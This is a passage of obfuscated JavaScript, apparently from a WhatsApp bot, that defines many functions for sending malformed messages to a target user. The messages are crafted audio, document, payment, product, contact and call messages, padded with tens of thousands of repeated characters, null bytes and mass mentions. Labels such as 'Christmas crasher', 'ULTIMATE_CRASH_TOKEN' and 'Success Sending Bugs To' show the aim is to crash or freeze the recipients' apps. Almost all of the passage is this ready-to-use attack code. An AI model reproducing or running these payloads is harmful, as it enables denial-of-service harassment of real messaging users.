A9ULA8/QrV1FCgR/lwxQRSBXjVMuXGBwBwQGz2rxLaGIy+EjYVZMmNMumW2p0xksdp9qikQ26sYIQTGoA2IQrCOTJHHcpUEsYd/wDp4vwZYi3kT8QGFnIPHHKVB4UNtboLdnLJH/DiWVsmIOSQ3LcmrIwFlRbTEYluBseMM3kkRhvzyCA2KEis6r4SBzblt+xMj8fZjGMdKUgvMVUKDM5CjoPNXU+1CZGQOGypGc1qw3WEwOMAo3PIO1gcGobO5k1Aw4gEkDTON0hJfx+cqcduoqOOeTUhCY4P4uF85wfCj24by8ggGtYllhjiskMDFWiDsrEj8NcbQMDr3qS6nRmL2qbW3hzvyy+MQTg7fSnuXEmZI4fxjKoIfj8XrkY5IrVSkn9nyRSROG3Q5LYyJBjIIzWoaNeyRSFIYCTC0eA56MoGcbeTxmrh3iSG0eFAxSOLOTwIm3Z246k0JWhRoggdcY4YqdpzwcA/U80bmSzy7RRys04lCg7ckLs24wcqBUV3ewW6pJb7wECE7ioZVGBuAH04q21R3Khoo2mDO2WOA5d/EPAHpQlcjiBNuzb/ABDu/Pv67frQJLSuwVS8jPhegyacEqFBILVpWo+Hm0lb8KQFUP8AKT2pW+csky2C6jcfUHmtUso4J4bvlhzG6npjtWk6Wk0UkpmdfPktwTg5zT2cLXTlNwRM7RnpvJNPYm5Mj4bw0Ub8dMngUbdDHtZiTE4B6cgcD9DWl6Xp14gjkBWaJTsYYqQap8uQrL4qMV6DDr2YfQ1b6BbupnvlZ5mzxk8f0qfQGSZVhz4RDMCeoKjdg0It0rSsOhKr6AUMYx9OKmtI2kJQ7WIBFRqyR4LEtj9aXkDHQ1pGgTajmVm8OEcBsdT6UshKlWPI4z+xrRtU8ODw3PRjWojxrCcLz5Ny+68io5Ra6MB/ekyBWmwGW1vZQuWbCr92qwtAumvGw5lBY1IBvmQ8bv2xirC6aCeKX/2FLIHUMDwRkVmrmd4w/hpvkMTBFrRrGOezuop1xL4p91rULeSxnKyDynv+xps+MjdtpX/eia0LS31G6VDxEg3SNUSRxIscYAVAAFHai+GQ/Xg1FKVkb1wa0yf5ixCnqAVrWpfB2Qr0ij/U18POkdnISeBtoOqxg9FC/pWowGK4kToQcqajkDFsfXOK0W6Mtv4Z6pRPFKxZw7dFOPtTziDXZou0saf1xV7BDqUU0LDDpwDU0LW2+Jjkxn9qHLAVocA0/Tt7DrCJn9S3P6Cvhy7e6+dkc5JlDV//xAAjEQEAAgEDBAIDAAAAAAAAAAABAAIRECExAxIgQSJREzJx/9oACAECAQE/AIcRc6VPs8MQqDLY+9QxqoMyaW/kDLKnMMg59QsOiK5m07md0UJ+U2O2NxNp35TYJnPgRCxvMMrxKmXxGe5cGz9yo+5SYJgmDUGWMWIIypMMqaWrDiLidQmWdO3xy6LgzG1l5jA+THllv1jzOmcykv6I8s//xAAjEQEAAgEEAgIDAQAAAAAAAAABAAIRAxAhQTEyEmETIFFx/9oACAEDAQE/AJgXEADBtZfA78z5RupKFp3PqXcu4KTFtqcdxcCyy8MthTHcapsJjExsOICkdN+PmGmjzLV4iYmWZZmLNPUR2s8y9sEd/wAdf5HSpACqkopUlkfE1Ov0eSMXqU5okap1LcTJHatumPt9YhVZpPkmJq1zbBsCuIUqHjOz6Ep6ynvK+pNXjH+zUPDNLtlfUn//2Q==",
          scansSidecar: "Sl6CM3K+yVZIMVPndmuHRGwdunpzPpsNeCSXWMY0a3s5d/Swhvc3rQ==",
          scanLengths: [9877, 27074, 16754, 31926],
          midQualityFileSha256: "vkK/C7Cj6CIkjZWGCg/pZ6x0pyBY0zSqPN7MymCYtOU="
        }
      }), {
        userJid: _0x2f9f51,
        quoted: _0x43f419
      });
      await _0x4b53e5.relayMessage(_0x2f9f51, _0x1f7424.message, {
        participant: {
          jid: _0x2f9f51
        },
        messageId: _0x1f7424.key.id
      });
    }
    async function _0x879184(_0x7e0c09, _0x17e3cc) {
      var _0x2713b6 = generateWAMessageFromContent(_0x7e0c09, proto.Message.fromObject({
        audioMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7117-24/18859499_1265034184525344_5636908076422039669_n.enc?ccb=11-4&oh=01_Q5AaIIqwcD0_rVI3CB2w7_8QNfLBRogABLxtYFQZOq9be6_p&oe=6753DF83&_nc_sid=5e03e0&mms3=true",
          mimetype: "audio/ogg; codecs=opus",
          fileSha256: "yKyJZ32mBC74+J6yy8yqMt5wb9HOj/8t9HhLUpHa568=",
          fileLength: "999999999",
          seconds: 999999999,
          ptt: true,
          mediaKey: "heLQ6g2yU6fm/niU/h2Cqz7uD0aGdJR3iEMINTvzkLs=",
          fileEncSha256: "t5OHuuPVg4s4O8rhLwoJWOMdQVk0QzzYNjwKKUNUnLk=",
          directPath: "/v/t62.7117-24/18859499_1265034184525344_5636908076422039669_n.enc?ccb=11-4&oh=01_Q5AaIIqwcD0_rVI3CB2w7_8QNfLBRogABLxtYFQZOq9be6_p&oe=6753DF83&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1730971536",
          waveform: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
          backgroundArgb: 4290879551
        }
      }), {
        userJid: _0x7e0c09,
        quoted: _0x17e3cc
      });
      await _0x4b53e5.relayMessage(_0x7e0c09, _0x2713b6.message, {
        participant: {
          jid: _0x7e0c09
        },
        messageId: _0x2713b6.key.id
      });
    }
    async function _0x7bd1cb(_0x436151, _0x4f543c) {
      var _0x486ac6 = generateWAMessageFromContent(_0x436151, proto.Message.fromObject({
        audioMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7117-24/18859499_1265034184525344_5636908076422039669_n.enc?ccb=11-4&oh=01_Q5AaIIqwcD0_rVI3CB2w7_8QNfLBRogABLxtYFQZOq9be6_p&oe=6753DF83&_nc_sid=5e03e0&mms3=true",
          mimetype: "audio/ogg; codecs=opus",
          fileSha256: "yKyJZ32mBC74+J6yy8yqMt5wb9HOj/8t9HhLUpHa568=",
          fileLength: "999999",
          seconds: 999999,
          ptt: true,
          mediaKey: "heLQ6g2yU6fm/niU/h2Cqz7uD0aGdJR3iEMINTvzkLs=",
          fileEncSha256: "t5OHuuPVg4s4O8rhLwoJWOMdQVk0QzzYNjwKKUNUnLk=",
          directPath: "/v/t62.7117-24/18859499_1265034184525344_5636908076422039669_n.enc?ccb=11-4&oh=01_Q5AaIIqwcD0_rVI3CB2w7_8QNfLBRogABLxtYFQZOq9be6_p&oe=6753DF83&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1730971536",
          waveform: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
          backgroundArgb: 4290879551
        }
      }), {
        userJid: _0x436151,
        quoted: _0x4f543c
      });
      await _0x4b53e5.relayMessage(_0x436151, _0x486ac6.message, {
        participant: {
          jid: _0x436151
        },
        messageId: _0x486ac6.key.id
      });
    }
    async function _0xd62a47(_0x4e21d0) {
      const _0x5051a6 = {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                  name: "⩟⬦𪲁 ��-�� -\0\0\0",
                  url: "https://wa.me/settings",
                  jpegThumbnail: ""
                },
                hasMediaAttachment: true
              },
              body: {
                text: "ꦾ".repeat(81000)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "review_and_pay",
                  buttonParamsJson: JSON.stringify({
                    currency: "IDR",
                    total_amount: {
                      value: 666666,
                      offset: 100
                    },
                    reference_id: "4Q79X9PCBEM",
                    type: "physical-goods",
                    order: {
                      status: "completed",
                      subtotal: {
                        value: 0,
                        offset: 100
                      },
                      order_type: "PAYMENT_REQUEST",
                      items: [{
                        retailer_id: "custom-item-7fca9870-8e3a-4a4a-bfb7-8a07fbf5fa9e",
                        name: "@1".repeat(50600),
                        amount: {
                          value: 666666,
                          offset: 100
                        },
                        quantity: 1
                      }]
                    },
                    additional_note: "KC-V7 Christmas crasher",
                    native_payment_methods: [],
                    share_payment_status: true
                  })
                }]
              },
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "最後 MARX 亗"
                }],
                isForwarded: true,
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{\n                                        \"screen_2_OptIn_0\": true,\n                                        \"screen_2_OptIn_1\": true,\n                                        \"screen_1_Dropdown_0\": \"XXX\",\n                                        \"screen_1_DatePicker_1\": \"1028995200000\",\n                                        \"screen_1_TextInput_2\": \"crasher@p.com\",\n                                        \"screen_1_TextInput_3\": \"94643116\",\n                                        \"screen_0_TextInput_0\": \"" + "\0".repeat(500000) + "\",\n                                        \"screen_0_TextInput_1\": \"Why?\",\n                                        \"screen_0_Dropdown_2\": \"001-Grimgar\",\n\n\"screen_0_RadioButtonsGroup_3\": \"0_true\",\n                                        \"flow_token\": \"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"\n                                    }",
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      };
      _0x4b53e5.relayMessage(_0x4e21d0, _0x5051a6, {
        participant: {
          jid: _0x4e21d0
        }
      }, {
        messageId: null
      });
    }
    async function _0x1c3c0a(_0x29a2b1) {
      _0x4b53e5.relayMessage(_0x29a2b1, {
        viewOnceMessage: {
          message: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
              fileLength: 0,
              pageCount: 666,
              mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
              fileName: "DARK~VIRUS (SKYZET)",
              fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
              directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1728631701",
              contactVcard: true,
              caption: "ꦾ".repeat(2000) + "@1".repeat(90000),
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@newsletter"),
                groupMentions: [{
                  groupJid: "1@newsletter",
                  groupSubject: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
                }],
                isForwarded: true,
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: {
                        screen_2_OptIn_0: true,
                        screen_2_OptIn_1: true,
                        screen_1_Dropdown_0: "ChuckyChristmasCrasher",
                        screen_1_DatePicker_1: "1028995200000",
                        screen_1_TextInput_2: "client@gmail.com",
                        screen_1_TextInput_3: "94643116",
                        screen_0_TextInput_0: "\0".repeat(500000),
                        screen_0_TextInput_1: "SecretDocu",
                        screen_0_Dropdown_2: "#9741-KCV7",
                        screen_0_RadioButtonsGroup_3: "0_true",
                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                      },
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x29a2b1
        }
      });
    }
    async function _0x2180a7(_0x3e9829) {
      _0x4b53e5.relayMessage(_0x3e9829, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.google-apps.document",
                  fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                  fileLength: 0,
                  pageCount: 0,
                  mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                  fileName: "Exe?",
                  fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1715880173",
                  contactVcard: true
                },
                title: "Aviliable Freeze",
                hasMediaAttachment: true
              },
              body: {
                text: "ꦾ".repeat(81000)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "address_message",
                  buttonParamsJson: JSON.stringify({
                    app_id: "com.bloks.www.whatsapp.commerce.address_message",
                    expiration_secs: 10200000,
                    version: "2.5",
                    supported_businesses: ""
                  })
                }, {
                  name: "payment_info",
                  buttonParamsJson: JSON.stringify({
                    currency: "BRL",
                    total_amount: {
                      value: 0,
                      offset: 100
                    },
                    reference_id: "4P46GMY57GC",
                    type: "physical-goods",
                    order: {
                      status: "pending",
                      subtotal: {
                        value: 0,
                        offset: 100
                      },
                      order_type: "ORDER",
                      items: [{
                        name: "",
                        amount: {
                          value: 0,
                          offset: 100
                        },
                        quantity: 0,
                        sale_amount: {
                          value: 0,
                          offset: 100
                        }
                      }]
                    },
                    payment_options: [{
                      type: "JioPay",
                      url_regex_list: ["^https://www.jio.com/.*$", "^https://t.jio/.*$", "^http://tiny.jio.com/.*$"],
                      title: {
                        name: "jiopay_title",
                        default_text: "Pay on Jio.com"
                      },
                      subtitle: {
                        name: "jiopay_subtitle",
                        default_text: "Go to Jio.com website"
                      },
                      button: {
                        name: "jiopay_button",
                        default_text: "ꦾ".repeat(50000)
                      }
                    }]
                  })
                }, {
                  name: "menu_options",
                  buttonParamsJson: {}
                }]
              },
              contextInfo: {
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: {
                        screen_2_OptIn_0: true,
                        screen_2_OptIn_1: true,
                        screen_1_Dropdown_0: "𝐊𝐈𝐋𝐋𝚵𝐑𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
                        screen_1_DatePicker_1: "1028995200000",
                        screen_1_TextInput_2: "tama@executor.com",
                        screen_1_TextInput_3: "94643116",
                        screen_0_TextInput_0: "\0".repeat(500000),
                        screen_0_TextInput_1: "Why?",
                        screen_0_Dropdown_2: "001-Grimgar",
                        screen_0_RadioButtonsGroup_3: "0_true",
                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                      },
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }, {
        participant: {
          jid: _0x3e9829
        }
      }, {
        messageId: null
      });
    }
    async function _0xb4a37f(_0x5cc80f, _0x3ba5af) {
      var _0x1e7004 = generateWAMessageFromContent(_0x5cc80f, proto.Message.fromObject({
        contactMessage: {
          displayName: "⩟⬦𪲁 ��-�� -\0\0\0" + "ꦾ".repeat(90000),
          vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;\0;;;\nFN:\0\nEND:VCARD"
        }
      }), {
        userJid: _0x5cc80f,
        quoted: _0x3ba5af
      });
      await _0x4b53e5.relayMessage(_0x5cc80f, _0x1e7004.message, {
        participant: {
          jid: _0x5cc80f
        },
        messageId: _0x1e7004.key.id
      });
    }
    async function _0x22ccc5(_0x1f69a8, _0x1c929e) {
      var _0x5ce86a = generateWAMessageFromContent(_0x1f69a8, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "⩟⬦𪲁 ��-�� -\0\0\0" + "ꦾ".repeat(90000),
                orderMessage: {
                  orderId: "1632408257656442",
                  thumbnail: "",
                  itemCount: 99999,
                  status: "INQUIRY",
                  surface: "CATALOG",
                  message: "⿻ᬃ𝐂𝐇𝐑𝐈𝐒𝐓𝐌𝐀𝐒 𝐂𝐑𝐀𝐒𝐇𝐄𝐑⃟⿻" + "ꦾ".repeat(90000),
                  orderTitle: "Website Scraping",
                  sellerJid: "0@s.whatsapp.net",
                  token: "AR4ZFrA5kAE0ihvqor9jdjYaeEIEhilmElFgd2fcYz4xtw==",
                  totalAmount1000: "999999999999999999",
                  totalCurrencyCode: "IDR",
                  messageVersion: 2
                }
              }
            }
          }
        }
      }), {
        userJid: _0x1f69a8,
        quoted: _0x1c929e
      });
      await _0x4b53e5.relayMessage(_0x1f69a8, _0x5ce86a.message, {
        participant: {
          jid: _0x1f69a8
        },
        messageId: _0x5ce86a.key.id
      });
    }
    async function _0x586a61(_0x29f071) {
      try {
        const _0x2864e5 = {
          upload: _0x4b53e5.waUploadToServer
        };
        const _0x3b7f3b = _0x2864e5;
        const _0x400e1e = await prepareWAMessageMedia({
          image: {
            url: "https://files.catbox.moe/1h6mh7.jpg"
          }
        }, _0x3b7f3b);
        const _0x59c190 = {
          productImage: _0x400e1e.imageMessage,
          productId: "375984352103936",
          title: "⩟⬦𪲁 ��-�� -\0\0\0" + "ꦾ".repeat(1000),
          description: "@chuckychristmascrasher\0",
          currencyCode: "IDR",
          priceAmount1000: 150000000,
          productImageCount: 1
        };
        const _0x2692c3 = {
          product: _0x59c190,
          businessOwnerJid: "0@s.whatsapp.net"
        };
        const _0x501f47 = _0x2692c3;
        const _0x18d83 = {
          productMessage: _0x501f47
        };
        const _0x7146a1 = _0x18d83;
        const _0x27d1f0 = await generateWAMessageFromContent(_0x29f071, proto.Message.fromObject(_0x7146a1));
        await _0x4b53e5.relayMessage(_0x29f071, _0x27d1f0.message, {
          messageId: _0x27d1f0.key.id
        });
        console.log("Success Sending Product Message to " + _0x29f071);
      } catch (_0x495e32) {
        console.error("Failed to Send Product Message to " + _0x29f071 + ":", _0x495e32);
      }
    }
    async function _0x7c52bf(_0x24866a, _0x3bfee1) {
      try {
        const _0x3d5947 = {
          upload: _0x4b53e5.waUploadToServer
        };
        const _0x15cfdd = _0x3d5947;
        const _0x291381 = await prepareWAMessageMedia({
          image: {
            url: "https://files.catbox.moe/1h6mh7.jpg"
          }
        }, _0x15cfdd);
        const _0x2a0c74 = {
          productImage: _0x291381.imageMessage,
          productId: "375984352103936",
          title: "⩟⬦𪲁 ��-�� -\0\0\0" + "ꦾ".repeat(90000),
          description: "@chuckychristmascrasher\0",
          currencyCode: "IDR",
          priceAmount1000: 150000000,
          productImageCount: 1
        };
        const _0x2003f1 = {
          product: _0x2a0c74,
          businessOwnerJid: "0@s.whatsapp.net"
        };
        const _0x5c2117 = _0x2003f1;
        const _0x3a699c = {
          productMessage: _0x5c2117
        };
        const _0x2015d4 = _0x3a699c;
        const _0x5f0eb1 = {
          quoted: _0x3bfee1
        };
        const _0xdc208f = await generateWAMessageFromContent(_0x24866a, proto.Message.fromObject(_0x2015d4), _0x21f0d9 && _0x21f0d9.fromMe ? {
          contextInfo: {
            ..._0x21f0d9.contextInfo
          }
        } : _0x5f0eb1);
        await _0x4b53e5.sendMessage(_0x24866a, _0xdc208f.message, _0xdc208f.options);
        console.log("Success Sending Bugs To " + _0x24866a);
      } catch (_0x4d4424) {
        console.error("Failed to Send Bugs To " + _0x24866a + ":", _0x4d4424);
      }
    }
    async function _0x61f4c5(_0x2a5531) {
      let _0x181214 = "@chuckychristmascrasher\0";
      const _0xe73196 = {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                  name: "@1".repeat(20000),
                  url: "https://api.whatsapp.com/send?phone=+🧸&text=" + "@1".repeat(1000),
                  sequenceNumber: 0,
                  jpegThumbnail: ""
                },
                hasMediaAttachment: true,
                contactVcard: true
              },
              body: {
                text: _0x181214 + "@1".repeat(105000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@broadcast"),
                groupMentions: [{
                  groupJid: "1@broadcast",
                  groupSubject: _0x181214
                }],
                isForwarded: true,
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "EXTENSIONS_7"
                    },
                    nativeFlowResponseMessage: {
                      name: "custom_message",
                      paramsJson: "{\n        \"screen_2_OptIn_0\": true,\n        \"screen_2_OptIn_1\": true,\n        \"screen_1_Dropdown_0\": \"HKC-QI-0\",\n        \"screen_0_Dropdown_1\": \"HK-9999\",\n        \"screen_1_DatePicker_1\": \"1028995200000\",\n        \"screen_1_TextInput_2\": \"qio@thebug.com\",\n        \"screen_1_TextInput_4\": \"https://www.google.com/\",\n        \"screen_1_TextInput_5\": \"https://api.whatsapp.com/send?phone=+🧸&text=\"+\"@1\".repeat(100),       \n        \"screen_1_TextInput_3\": \"94643116\",\n        \"screen_0_TextInput_0\": \"" + "".repeat(602000) + "\",\n        \"screen_0_TextInput_1\": \"HK-3001\",\n        \"screen_0_TextInput_2\": \"HK-6666\",\n        \"screen_0_TextInput_3\": \"HK-3004\",\n        \"screen_4_TextInput_8\": \"0x80048820\",\n        \"screen_0_TextInput_4\": \"HK-3005\",\n        \"screen_0_TextInput_5\": \"HK-3000\",\n        \"screen_0_TextInput_6\": \"HK-3002\",\n        \"screen_0_TextInput_7\": \"HK-3005\",\n        \"screen_0_TextInput_8\": \"HK-3006\",\n        \"screen_0_TextInput_9\": \"HK-3008\",\n        \"screen_0_TextInput_10\": \"HK-1001\",\n        \"screen_1_TextInput_0\": \"HK-2002\",\n        \"screen_2_TextInput_0\": \"HK-5005\",\n        \"screen_3_TextInput_0\": \"HK-3003\",\n        \"screen_5_TextInput_0\": \"Doomsday-2024\",\n        \"screen_0_Dropdown_2\": \"8.9.9_@chuckychristmascrasher  ~\",\n        \"screen_0_Dropdown_3\": \"HK-0001\",\n        \"screen_0_Dropdown_4\": \"Doomsday-2024\",\n        \"screen_3_EmojiBombCrash_004\": \"😼\".repeat(10000),\n        \"flow_token\": \"TAMAAAAULTIMATE_CRASH_TOKEN_CRASHCODE_9741_EXECUTOR.\"\n    }",
                      version: 3
                    }
                  }
                }
              }
            },
            isForwarded: true,
            share_payment_status: true
          }
        },
        messageParamsJson: "\0".repeat(999999)
      };
      _0x4b53e5.relayMessage(_0x2a5531, _0xe73196, {
        participant: {
          jid: _0x2a5531
        },
        messageId: null
      });
    }
    async function _0x30106a(_0x3529ab) {
      let _0x5f1541 = "⩟⬦𪲁 ��-�� -\0\0\0";
      const _0x408692 = {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                  name: "ꦾ".repeat(50000),
                  url: "https://api.whatsapp.com/send?phone=+🧸&text=" + "@1".repeat(103000),
                  sequenceNumber: 0,
                  jpegThumbnail: ""
                },
                hasMediaAttachment: true,
                contactVcard: true
              },
              body: {
                text: _0x5f1541 + "@1".repeat(88000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
                  length: 5
                }, () => "1@broadcast"),
                groupMentions: [{
                  groupJid: "1@broadcast",
                  groupSubject: _0x5f1541
                }],
                isForwarded: true,
                quotedMessage: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "EXTENSIONS_7"
                    },
                    nativeFlowResponseMessage: {
                      name: "custom_message",
                      paramsJson: "{\n        \"screen_2_OptIn_0\": true,\n        \"screen_2_OptIn_1\": true,\n        \"screen_1_Dropdown_0\": \"HKC-QI-0\",\n        \"screen_0_Dropdown_1\": \"HK-9999\",\n        \"screen_1_DatePicker_1\": \"1028995200000\",\n        \"screen_1_TextInput_2\": \"TamaXyz@BugAviliable.com\",\n        \"screen_1_TextInput_4\": \"https://www.google.com/\",\n        \"screen_1_TextInput_5\": \"https://api.whatsapp.com/send?phone=+🧸&text=\"+\"@1\".repeat(90000),       \n        \"screen_1_TextInput_3\": \"94643116\",\n        \"screen_0_TextInput_0\": \"" + "".repeat(55000) + "\",\n        \"screen_0_TextInput_1\": \"HK-3001\",\n        \"screen_0_TextInput_2\": \"HK-6666\",\n        \"screen_0_TextInput_3\": \"HK-3004\",\n        \"screen_4_TextInput_8\": \"0x80048820\",\n        \"screen_0_TextInput_4\": \"HK-3005\",\n        \"screen_0_TextInput_5\": \"HK-3000\",\n        \"screen_0_TextInput_6\": \"HK-3002\",\n        \"screen_0_TextInput_7\": \"HK-3005\",\n        \"screen_0_TextInput_8\": \"HK-3006\",\n        \"screen_0_TextInput_9\": \"HK-3008\",\n        \"screen_0_TextInput_10\": \"HK-1001\",\n        \"screen_1_TextInput_0\": \"HK-2002\",\n        \"screen_2_TextInput_0\": \"HK-5005\",\n        \"screen_3_TextInput_0\": \"HK-3003\",\n        \"screen_5_TextInput_0\": \"Doomsday-2024\",\n        \"screen_0_Dropdown_2\": \"0.0.9_#AmpasWKWK\",\n        \"screen_0_Dropdown_3\": \"HK-0001\",\n        \"screen_0_Dropdown_4\": \"Doomsday-2024\",\n        \"screen_3_EmojiBombCrash_004\": \"😹\".repeat(10000),\n        \"flow_token\": \"AQAAAAAULTIMATE_CRASH_TOKEN_TaMaXyZ_X9Y7Z41_FINIXTRASH.\"\n    }",
                      version: 3
                    }
                  }
                }
              }
            },
            isForwarded: true,
            share_payment_status: true
          }
        },
        messageParamsJson: "\0".repeat(55000)
      };
      _0x4b53e5.relayMessage(_0x3529ab, _0x408692, {
        participant: {
          jid: _0x3529ab
        },
        messageId: null
      });
    }
    async function _0x12cc93(_0x5e3bcc) {
      let _0x27808b = generateWAMessageFromContent(_0x5e3bcc, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            scheduledCallCreationMessage: {
              scheduledTimestampMs: Date.now(),
              callType: 2,
              title: "\0" + "ꦾ".repeat(90000)
            }
          }
        }
      }), {
        userJid: _0x5e3bcc
      });
      await _0x4b53e5.relayMessage(_0x5e3bcc, _0x27808b.message, {
        participant: {
          jid: _0x5e3bcc
        }
      });
    }
    async function _0x1de401(_0x432c57, _0x483a0f = false) {
      await _0x4b53e5.relayMessage(_0x432c57, {
        extendedTextMessage: {
          text: "⩟⬦𪲁 ��-�� -\0\0\0" + "@0".repeat(90000),
          contextInfo: {
            mentionedJid: ["0@s.whatsapp.net", ...Array.from({
              length: 15000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            stanzaId: "1234567890ABCDEF",
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              callLogMesssage: {
                isVideo: true,
                callOutcome: "1",
                durationSecs: "0",
                callType: "REGULAR",
                participants: [{
                  jid: "0@s.whatsapp.net",
                  callOutcome: "1"
                }]
              }
            },
            remoteJid: _0x432c57,
            conversionSource: " target ",
            conversionData: "",
            conversionDelaySeconds: 10,
            forwardingScore: 9999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " target ",
              mediaType: "IMAGE",
              jpegThumbnail: "https://d.top4top.io/p_32640ogxp0.jpg",
              caption: " target "
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            },
            expiration: 86400,
            ephemeralSettingTimestamp: "1728090592378",
            ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
            externalAdReply: {
              title: "\0",
              body: "\0",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewType: "VIDEO",
              thumbnail: "https://d.top4top.io/p_32640ogxp0.jpg",
              sourceType: " target ",
              sourceId: " target ",
              sourceUrl: "https://www.instagram.com/WhatsApp",
              mediaUrl: "https://www.instagram.com/WhatsApp",
              containsAutoReply: true,
              showAdAttribution: true,
              ctwaClid: "ctwa_clid_example",
              ref: "ref_example"
            },
            entryPointConversionSource: "entry_point_source_example",
            entryPointConversionApp: "entry_point_app_example",
            entryPointConversionDelaySeconds: 5,
            disappearingMode: {},
            actionLink: {
              url: "https://www.instagram.com/WhatsApp"
            },
            groupSubject: " target ",
            parentGroupJid: "120363321780343299-0@g.us",
            trustBannerType: " target ",
            trustBannerAction: 1,
            isSampled: true,
            utm: {
              utmSource: " target ",
              utmCampaign: " target "
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363321780343299-0@g.us",
              serverMessageId: 1,
              newsletterName: " target ",
              contentType: "UPDATE",
              accessibilityText: " target "
            },
            businessMessageForwardInfo: {
              businessOwnerJid: "0@s.whatsapp.net"
            },
            smbClientCampaignId: "smb_client_campaign_id_example",
            smbServerCampaignId: "smb_server_campaign_id_example",
